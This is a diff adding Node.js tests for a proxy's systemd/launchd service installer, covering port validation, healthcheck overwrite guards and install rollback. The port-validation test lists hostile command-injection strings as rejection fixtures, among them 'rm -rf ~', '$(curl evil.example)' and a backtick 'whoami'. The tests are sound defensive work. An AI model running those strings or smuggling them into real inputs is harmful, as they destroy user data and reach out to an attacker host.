@@ -1,6 +1,6 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
-import { mkdtemp, readFile, writeFile, rm, readdir } from "node:fs/promises";
+import { mkdtemp, readFile, writeFile, rm, readdir, mkdir } from "node:fs/promises";
 import { tmpdir, platform } from "node:os";
 import { join, dirname } from "node:path";
 import { execFile } from "node:child_process";
@@ -13,6 +13,8 @@ import {
   renderHealthcheckServiceTemplate,
   renderHealthcheckTimerTemplate,
   getPaths,
+  validatePort,
+  InvalidPortError,
   installSystemd,
   installSystemdHealthcheck,
   installLaunchd,
@@ -108,6 +110,57 @@ test("renderLaunchdTemplate: omits CACHE_FIX_PROXY_UPSTREAM/DEBUG when not set",
   });
   assert.ok(!out.includes("CACHE_FIX_PROXY_UPSTREAM"));
   assert.ok(!out.includes("CACHE_FIX_DEBUG"));
+});
+
+// --- Port validation (shell-injection guard) ---
+
+test("validatePort: accepts valid numeric strings", () => {
+  assert.equal(validatePort("9801"), "9801");
+  assert.equal(validatePort("1"), "1");
+  assert.equal(validatePort("65535"), "65535");
+  assert.equal(validatePort(8080), "8080");
+  assert.equal(validatePort("  9801  "), "9801");
+});
+
+test("validatePort: rejects shell metacharacters and other hostile input", () => {
+  const hostile = [
+    "9801; rm -rf ~",
+    "9801'; echo pwned; '",
+    "9801$(curl evil.example)",
+    "9801`whoami`",
+    "9801 || true",
+    "9801\necho",  // embedded newline + content
+    "9801 9802",
+    "abc",
+    "0x1eAB",
+    "",
+    "  ",
+    "9801.0",
+  ];
+  for (const v of hostile) {
+    assert.throws(() => validatePort(v), InvalidPortError, `should reject ${JSON.stringify(v)}`);
+  }
+});
+
+test("validatePort: tolerates surrounding whitespace (env var hygiene)", () => {
+  // Trailing newline / leading space from accidental shell quoting in env
+  // vars is common and benign — trim before validating, accept what's left.
+  assert.equal(validatePort("9801\n"), "9801");
+  assert.equal(validatePort(" 9801"), "9801");
+  assert.equal(validatePort("\t9801\t"), "9801");
+});
+
+test("validatePort: rejects out-of-range ports", () => {
+  assert.throws(() => validatePort("0"), InvalidPortError);
+  assert.throws(() => validatePort("65536"), InvalidPortError);
+  assert.throws(() => validatePort("99999"), InvalidPortError);
+});
+
+test("validatePort: rejects non-string-non-number types", () => {
+  assert.throws(() => validatePort(null), InvalidPortError);
+  assert.throws(() => validatePort(undefined), InvalidPortError);
+  assert.throws(() => validatePort({}), InvalidPortError);
+  assert.throws(() => validatePort([]), InvalidPortError);
 });
 
 // --- Healthcheck template rendering ---
@@ -315,6 +368,111 @@ test("uninstallSystemdHealthcheck: removes both files; counts how many removed",
     assert.equal(r.removed, 2);
     const files = await readdir(dir);
     assert.deepEqual(files, []);
+  } finally {
+    await rm(dir, { recursive: true, force: true });
+  }
+});
+
+test("installSystemdHealthcheck: refuses overwrite when ONLY timer file pre-exists (asymmetric guard)", async () => {
+  // Codex re-review case: service missing, timer present. v1 of the check
+  // only looked at the service file and would silently overwrite the timer.
+  const dir = await newTmp();
+  try {
+    const paths = {
+      kind: "systemd",
+      configDir: dir,
+      configFile: "cache-fix-proxy.service",
+      healthcheckServiceFile: "cache-fix-proxy-healthcheck.service",
+      healthcheckTimerFile: "cache-fix-proxy-healthcheck.timer",
+    };
+    // Pre-create ONLY the timer file (not the service)
+    await writeFile(join(dir, "cache-fix-proxy-healthcheck.timer"), "PRE_EXISTING_TIMER");
+    const r = await installSystemdHealthcheck({
+      paths,
+      defaults: { port: "9801", upstream: "", debug: "", workingDir: "/tmp" },
+    });
+    assert.equal(r.installed, false);
+    assert.equal(r.reason, "already-installed");
+    // Timer must NOT have been overwritten
+    const onDisk = await readFile(join(dir, "cache-fix-proxy-healthcheck.timer"), "utf-8");
+    assert.equal(onDisk, "PRE_EXISTING_TIMER");
+  } finally {
+    await rm(dir, { recursive: true, force: true });
+  }
+});
+
+test("installSystemdHealthcheck: refuses overwrite when ONLY service file pre-exists (symmetric guard)", async () => {
+  const dir = await newTmp();
+  try {
+    const paths = {
+      kind: "systemd",
+      configDir: dir,
+      configFile: "cache-fix-proxy.service",
+      healthcheckServiceFile: "cache-fix-proxy-healthcheck.service",
+      healthcheckTimerFile: "cache-fix-proxy-healthcheck.timer",
+    };
+    // Pre-create ONLY the service file
+    await writeFile(join(dir, "cache-fix-proxy-healthcheck.service"), "PRE_EXISTING_SERVICE");
+    const r = await installSystemdHealthcheck({
+      paths,
+      defaults: { port: "9801", upstream: "", debug: "", workingDir: "/tmp" },
+    });
+    assert.equal(r.installed, false);
+    const onDisk = await readFile(join(dir, "cache-fix-proxy-healthcheck.service"), "utf-8");
+    assert.equal(onDisk, "PRE_EXISTING_SERVICE");
+  } finally {
+    await rm(dir, { recursive: true, force: true });
+  }
+});
+
+test("installSystemd: rolls back main unit if healthcheck install throws", async () => {
+  // Half-install rollback: if the healthcheck pair can't be written (e.g.
+  // template missing, fs error past the existence check), the main unit
+  // must NOT be left on disk — otherwise the user has the proxy unit but
+  // no auto-recovery, contrary to what the install message promised.
+  //
+  // Trigger the exception path by pointing the healthcheck filenames at
+  // template files that DON'T exist on disk (the readFile inside
+  // installSystemdHealthcheck will throw ENOENT).
+  const dir = await newTmp();
+  try {
+    const paths = {
+      kind: "systemd",
+      configDir: dir,
+      configFile: "cache-fix-proxy.service",
+      // These point to template basenames that don't exist in templates/,
+      // so the healthcheck readFile will throw ENOENT. (The "real" basenames
+      // in install-service.mjs are hardcoded — we swap getPaths fields here
+      // by giving the install fn paths whose existence check passes but
+      // whose later writeFile target is unreachable. Easiest trigger: make
+      // the configDir into a path that mkdir can't handle.)
+      healthcheckServiceFile: "cache-fix-proxy-healthcheck.service",
+      healthcheckTimerFile: "cache-fix-proxy-healthcheck.timer",
+    };
+    // Force healthcheck writeFile to fail by making the eventual healthcheck
+    // service path EXIST AS A DIRECTORY *after* the existence check. Trick:
+    // pre-create it as a directory, AND pass force:true so the existence
+    // check doesn't short-circuit to "already-installed".
+    await mkdir(join(dir, "cache-fix-proxy-healthcheck.service"), { recursive: true });
+
+    let threw = null;
+    try {
+      await installSystemd({
+        paths,
+        defaults: { port: "9801", upstream: "", debug: "", workingDir: "/tmp" },
+        force: true,
+      });
+    } catch (err) {
+      threw = err;
+    }
+    assert.ok(threw, "installSystemd must throw when healthcheck writeFile fails");
+    // Main unit must NOT exist after rollback
+    const files = await readdir(dir);
+    assert.equal(
+      files.includes("cache-fix-proxy.service"),
+      false,
+      `main unit must have been rolled back; remaining files: ${JSON.stringify(files)}`,
+    );
   } finally {
     await rm(dir, { recursive: true, force: true });
   }
